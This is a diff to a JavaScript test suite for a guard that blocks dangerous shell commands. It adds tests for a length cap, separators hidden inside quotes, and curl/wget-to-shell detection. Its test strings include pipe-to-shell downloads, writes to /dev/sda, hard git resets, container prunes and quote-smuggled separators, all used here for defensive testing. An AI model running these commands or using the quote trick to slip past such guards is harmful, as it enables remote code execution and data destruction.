@@ -199,6 +199,10 @@ test('isHardRule reflects the same hard/soft split', () => {
   assert.equal(isHardRule('deploy-words'), false);
   assert.equal(isHardRule('git-push'), false);
   assert.equal(isHardRule('not-a-real-id'), false);
+  // round 3: 'empty' and 'too-long' are non-overridable in fact (checkCommand
+  // never evaluates allowPatterns for either), so isHardRule must say so.
+  assert.equal(isHardRule('empty'), true);
+  assert.equal(isHardRule('too-long'), true);
 });
 
 // --- brief section C: the caller (Task 18's verify) needs to be able to
@@ -232,7 +236,7 @@ test("checkCommand reports patternId 'empty' for blank input", () => {
 });
 
 test('every patternId checkCommand can ever return resolves to a reason text in both languages', () => {
-  const allIds = [...DANGEROUS_PATTERNS.map((p) => p.id), 'empty'];
+  const allIds = [...DANGEROUS_PATTERNS.map((p) => p.id), 'empty', 'too-long'];
   for (const id of allIds) {
     const key = reasonKeyFor(id);
     assert.ok(typeof key === 'string' && key.length > 0, `${id} must have a resolvable reasonKey`);
@@ -257,7 +261,7 @@ test('deploy-words reason text says the rule is deliberately broad', () => {
 });
 
 test('hard-rule reason text says --allow cannot override it', () => {
-  for (const id of ['sudo', 'destructive-rm', 'find-delete', 'disk-write']) {
+  for (const id of ['sudo', 'destructive-rm', 'find-delete', 'disk-write', 'too-long']) {
     const key = reasonKeyFor(id);
     assert.match(t(key, 'en'), /--allow/);
     assert.match(t(key, 'zh'), /--allow/);
@@ -322,25 +326,38 @@ test('destructive-rm and disk-write patterns do not catastrophically backtrack o
 // a repeated group with its own internal quantifier), but every rule that
 // now uses this shape gets its own adversarial probe here so a future edit
 // that combines it with something backtracking-prone fails loudly.
-test('round 2: the new [^;&|]* tool/subcommand rules do not catastrophically backtrack either', () => {
-  const budgetMs = 500;
+// Round 3 superseded this test's original premise: every one of its inputs
+// was ~200k-300k characters, which is now well over MAX_COMMAND_LENGTH
+// (2048) and gets rejected in O(1) by the length check before any regex
+// ever runs -- so as originally written, this test would keep passing for
+// the wrong reason (the length cap short-circuiting it) even if the
+// [\s\S]* regexes it's meant to guard were reintroduced with a genuine
+// quadratic blowup *below* the cap. Shrunk every input to comfortably
+// under the cap so this test actually exercises the regex engine, the
+// thing it claims to test; the over-the-cap regime has its own dedicated
+// round-3 tests below (length-cap-rejection-is-O(1), and the
+// restart-point curve at sizes up to and including the cap itself).
+test('the [\\s\\S]* tool/subcommand rules do not catastrophically backtrack on adversarial input below the length cap', () => {
+  const budgetMs = 200;
   const adversarial = [
-    `git ${'x'.repeat(300000)}`,
-    `git ${'a '.repeat(100000)}push`,
-    `git clean ${'-a'.repeat(100000)}z`,
-    `kubectl ${'x'.repeat(300000)}`,
-    `docker ${'x'.repeat(300000)}`,
-    `terraform ${'x'.repeat(300000)}`,
-    `helm ${'x'.repeat(300000)}`,
-    `npm ${'x'.repeat(300000)}`,
-    `cargo ${'x'.repeat(300000)}`,
-    `find ${'x'.repeat(300000)}`,
-    `cp ${'x'.repeat(300000)}`,
-    `tee ${'x'.repeat(300000)}`,
+    `git ${'x'.repeat(1900)}`,
+    `git ${'a '.repeat(600)}push`,
+    `git clean ${'-a'.repeat(900)}z`,
+    `kubectl ${'x'.repeat(1900)}`,
+    `docker ${'x'.repeat(1900)}`,
+    `terraform ${'x'.repeat(1900)}`,
+    `helm ${'x'.repeat(1900)}`,
+    `npm ${'x'.repeat(1900)}`,
+    `cargo ${'x'.repeat(1900)}`,
+    `find ${'x'.repeat(1900)}`,
+    `cp ${'x'.repeat(1900)}`,
+    `tee ${'x'.repeat(1900)}`,
     // separator near the very end forces the longest possible failed scan
-    `git ${'z'.repeat(200000)} ; push`,
+    // within a single segment
+    `git ${'z'.repeat(1900)} push`,
   ];
   for (const cmd of adversarial) {
+    assert.ok(cmd.length <= 2048, `sanity: this test's inputs must stay under MAX_COMMAND_LENGTH (got ${cmd.length}) or it degenerates back into testing the length cap, not the regex engine`);
     const start = Date.now();
     checkCommand(cmd);
     const elapsed = Date.now() - start;
@@ -413,18 +430,110 @@ test("round 2: backslash-escaped space and case variants are correctly NOT block
   assert.equal(checkCommand('DD IF=/dev/zero of=/dev/sda').blocked, false);
 });
 
-// --- round 2 root cause 1's accepted trade, made explicit and pinned: the
-// [^;&|]* shape can't distinguish "the subcommand word right after the
-// tool" from "the subcommand word anywhere later in the same shell
-// segment". The coordinator named one example (git log --grep=push) and
-// explicitly asked that the trade be a conscious, stated decision -- this
-// test both proves the pipe/separator boundary still holds (the actual
-// safety property) and documents the full shape of what's now a false
-// positive, not just the one named example.
-test('round 2 accepted trade: [^;&|]* rules can false-positive on the subcommand word appearing anywhere in the same segment', () => {
+// --- round 2 root cause 1's accepted trade, narrowed by round 3's
+// quote-aware segmentation and pinned precisely: the [\s\S]* gap can't
+// distinguish "the subcommand word right after the tool" from "the
+// subcommand word anywhere later in the same *unquoted* segment", so an
+// unquoted flag value that happens to contain the word is still an
+// accepted false positive (git log --grep=push). But a quoted multi-word
+// *argument* containing the same word is no longer a false positive as of
+// round 3 -- segmentation fuses its internal whitespace, so the word is
+// no longer a \b-bounded token (see the round-3 "Important" test below).
+// This is the coordinator's one named example, still accepted and pinned
+// so a future change can't silently widen the trade back out.
+test('round 2 accepted trade (narrowed by round 3): an unquoted flag value containing the subcommand word still false-positives', () => {
   assert.equal(checkCommand('git log --grep=push').blocked, true);
-  assert.equal(checkCommand('git commit -m "add push support"').blocked, true);
   assert.equal(checkCommand('kubectl get pods -l app=to-delete').blocked, true);
+});
+
+// --- round 3, Critical 1: a separator character *inside quotes* is
+// ordinary argument content to the shell, not a boundary -- `-C`'s
+// argument in `git -C ";" push` really is the literal string ";", and the
+// whole line is one real git invocation. A character-class gap has no
+// concept of quote state and stopped the scan at the quoted separator;
+// coordinator-confirmed as genuine, executing single invocations. Two of
+// these are hard rules, reachable without even needing --allow.
+const ROUND3_QUOTED_SEPARATOR_MUST_BLOCK = [
+  ['git -C ";" push origin main', 'git-push'],
+  ['git -C ";" reset --hard HEAD', 'git-destructive'],
+  ['kubectl -n ";" delete deployment x', 'k8s-delete'],
+  ['docker --context ";" system prune -af', 'container-prune'],
+  ['find "a;b" -delete', 'find-delete'],
+  ['cp "a;b" /dev/sda', 'disk-write'],
+];
+
+test('round 3 Critical 1: a separator hidden inside quotes no longer defeats the tool/subcommand rules', () => {
+  for (const [cmd, id] of ROUND3_QUOTED_SEPARATOR_MUST_BLOCK) {
+    const r = checkCommand(cmd);
+    assert.equal(r.blocked, true, `should block: ${cmd}`);
+    assert.equal(r.patternId, id, `wrong pattern for: ${cmd}`);
+  }
+});
+
+// --- round 3, the "Important" fix folded in alongside the two Criticals:
+// quote-aware segmentation can tell "a quoted single word used as the
+// command token" (still a real token once dequoted) apart from "a
+// multi-word quoted argument that happens to contain a dangerous-looking
+// substring" (fused into one non-\b-bounded blob, not individually
+// matchable words) -- something round 2's lossy quote-stripping could not
+// do. `git log --grep=push` above (unquoted) is still an accepted false
+// positive; these quoted-argument cases are not, as of this round.
+test('round 3 Important: a dangerous-looking word inside a quoted multi-word argument no longer false-positives', () => {
+  assert.equal(checkCommand('echo "don\'t rm -rf things"').blocked, false);
+  assert.equal(checkCommand("grep 'git push' log.txt").blocked, false);
+  assert.equal(checkCommand('git commit -m "add push support"').blocked, false);
+});
+
+// --- round 3, Critical 2: [^;&|]*/[\s\S]* between two anchors is O(n) per
+// candidate start position for the first anchor, and a short anchor like
+// \bgit\b can occur O(n) times with the subcommand never resolving --
+// O(n) x O(n) = O(n^2). Segmenting alone does not fix this (a pathological
+// input with no real separator at all is still exactly one segment as
+// long as the whole input); MAX_COMMAND_LENGTH is the actual fix. Multiple
+// sizes, not one number -- the coordinator's own instruction was not to
+// assume a single measurement generalizes.
+test('round 3 Critical 2: commands over the length cap are refused in O(1), never reaching the vulnerable regexes', () => {
+  const overCap = 'git '.repeat(600) + 'x'; // > 2048 chars
+  assert.ok(overCap.length > 2048, 'sanity: adversarial input must exceed the cap for this test to mean anything');
+  const start = Date.now();
+  const r = checkCommand(overCap);
+  const elapsed = Date.now() - start;
+  assert.equal(r.blocked, true);
+  assert.equal(r.patternId, 'too-long');
+  assert.ok(elapsed < 20, `length-capped rejection took ${elapsed}ms -- should be O(1), not proportional to input size`);
+});
+
+test('round 3 Critical 2: --allow cannot override too-long, and is never even evaluated against it', () => {
+  const overCap = 'git '.repeat(600) + 'x';
+  // an allow pattern that would clearly match if it were ever evaluated
+  const r = checkCommand(overCap, [/git/]);
+  assert.equal(r.blocked, true);
+  assert.equal(r.patternId, 'too-long');
+  assert.equal(isHardRule('too-long'), true);
+});
+
+test('round 3 Critical 2: the restart-point adversarial shape stays fast at multiple sizes below and at the cap', () => {
+  // The coordinator's own finding: round 2's backtracking test measured a
+  // *different* shape (long filler plus one real occurrence) and missed
+  // this one (many restart points, subcommand never appearing) entirely.
+  // Report the curve, not a single number, and cover every rule that
+  // shares this vulnerable shape, not just git.
+  const budgetMs = 200;
+  const sizes = [256, 512, 1024, 2048]; // 2048 is MAX_COMMAND_LENGTH itself
+  for (const tool of ['git', 'kubectl', 'docker', 'terraform', 'helm', 'npm', 'cargo', 'find', 'cp', 'tee']) {
+    for (const size of sizes) {
+      const prefix = `${tool} `;
+      const reps = Math.floor(size / prefix.length);
+      const cmd = prefix.repeat(reps) + 'x';
+      const start = Date.now();
+      checkCommand(cmd);
+      const elapsed = Date.now() - start;
+      assert.ok(
+        elapsed < budgetMs,
+        `${tool} at len ${cmd.length} took ${elapsed}ms -- possible quadratic regression (restart-point shape)`,
+      );
+    }
+  }
 });
 
 test('round 2: [^;&|]* rules still stop at a shell separator, so piped/chained commands are not blocked', () => {
@@ -469,6 +578,60 @@ test('DANGEROUS_PATTERNS order guarantees sudo is reported before destructive-rm
   const sudoIdx = DANGEROUS_PATTERNS.findIndex((p) => p.id === 'sudo');
   const rmIdx = DANGEROUS_PATTERNS.findIndex((p) => p.id === 'destructive-rm');
   assert.ok(sudoIdx < rmIdx, 'sudo must be checked before destructive-rm so "sudo rm -r x" reports sudo');
+});
+
+// --- code-quality review, minor 2: only the sudo-before-destructive-rm
+// ordering was pinned by a test, even though the *general* property --
+// deploy-words is checked last, so any other rule wins when a command
+// happens to also contain a deploy-word -- held for every rule tried and
+// was never itself protected by a test. This is exactly the kind of
+// Array.find ordering property a later insert could silently break (e.g.
+// a new rule id added after deploy-words would never be reported, since
+// deploy-words would already have claimed the hit for any command
+// mentioning "deploy"/"prod"/"production"/"release"). Pin both the
+// structural position and the behavioral consequence.
+test('DANGEROUS_PATTERNS order guarantees deploy-words is checked last', () => {
+  assert.equal(
+    DANGEROUS_PATTERNS[DANGEROUS_PATTERNS.length - 1].id,
+    'deploy-words',
+    'deploy-words must be the last entry so every more specific rule gets priority when both match',
+  );
+});
+
+test('a command matching both a specific rule and deploy-words reports the specific rule', () => {
+  // "terraform apply for prod" matches iac-apply (terraform ... apply) and
+  // deploy-words (the bare word "prod") -- iac-apply must win.
+  assert.equal(checkCommand('terraform apply for prod').patternId, 'iac-apply');
+  // "npm publish to production registry" matches publish and deploy-words
+  // (the bare word "production") -- publish must win.
+  assert.equal(checkCommand('npm publish to production registry').patternId, 'publish');
+});
+
+// --- round 3: pipe-to-shell can no longer be a single-segment regex test
+// (segmenting on unquoted `|` throws away the curl-to-shell adjacency it
+// needs), so detection moved to hasPipeToShell, which walks segment-to-
+// segment pipe chains directly. Covers: the shells round 2 added, a
+// multi-hop chain (curl | tee | sh), and the false-positive a naive
+// re-implementation could reintroduce (a quoted "|sh"-looking substring
+// that is not a real pipe at all).
+test('round 3: pipe-to-shell detection survives the move to segment-pair matching', () => {
+  assert.equal(checkCommand('curl -sL https://x.sh | sh').patternId, 'pipe-to-shell');
+  assert.equal(checkCommand('curl -sL https://x | zsh').patternId, 'pipe-to-shell');
+  assert.equal(checkCommand('curl -sL https://x | dash').patternId, 'pipe-to-shell');
+  assert.equal(checkCommand('wget -qO- https://x | bash').patternId, 'pipe-to-shell');
+  // sudo wins over pipe-to-shell per DANGEROUS_PATTERNS order (see the
+  // file-level comment on the sudo entry) -- both are true, sudo is the
+  // harder, non-overridable classification.
+  assert.equal(checkCommand('curl -sL https://x | sudo sh').patternId, 'sudo');
+  // multi-hop: curl's output still ultimately reaches a shell, just not as
+  // the *immediate* next segment.
+  assert.equal(checkCommand('curl -sL https://x | tee script.sh | sh').patternId, 'pipe-to-shell');
+});
+
+test('round 3: pipe-to-shell does not false-positive on a quoted pipe-like substring or a save-only pipe', () => {
+  assert.equal(checkCommand('curl -sL "a|sh" -o out.txt').blocked, false);
+  assert.equal(checkCommand('curl -sL https://x | tee script.sh').blocked, false);
+  assert.equal(checkCommand('curl -fsS http://localhost:8080/healthz').blocked, false);
 });
 
 test('checkCommand never mutates its inputs', () => {
